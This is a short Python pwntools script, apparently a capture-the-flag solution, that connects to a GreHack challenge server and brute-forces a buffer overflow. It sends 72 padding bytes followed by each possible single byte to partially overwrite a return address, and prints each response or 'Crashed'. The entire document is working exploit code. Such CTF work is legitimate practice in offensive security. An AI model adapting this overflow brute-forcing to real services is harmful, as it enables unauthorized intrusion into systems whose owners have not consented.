from pwn import *

context.log_level = 'error'

offset = 72

for i in range(255):
  p = remote(host='challenges.ctf.grehack.fr', port=32411)
  p.send(b"A" * offset + p8(i))
  try:
    print(p.recvall( timeout=2))
  except:
    print("Crashed")
  p.close()


